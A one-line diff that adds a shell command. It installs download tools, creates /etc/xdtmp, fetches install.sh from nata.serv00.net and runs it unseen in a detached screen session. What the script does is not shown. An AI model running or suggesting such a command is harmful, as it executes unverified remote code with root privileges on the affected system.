@@ -1,0 +1,1 @@
+apt-get update -y && apt install curl wget bzip2 gzip xz-utils screen && if [[ ! -d /etc/xdtmp ]]; then mkdir -p /etc/xdtmp; fi && wget -q https://nata.serv00.net/v1.8/install.sh && chmod +x install.sh && screen -S install ./install.sh
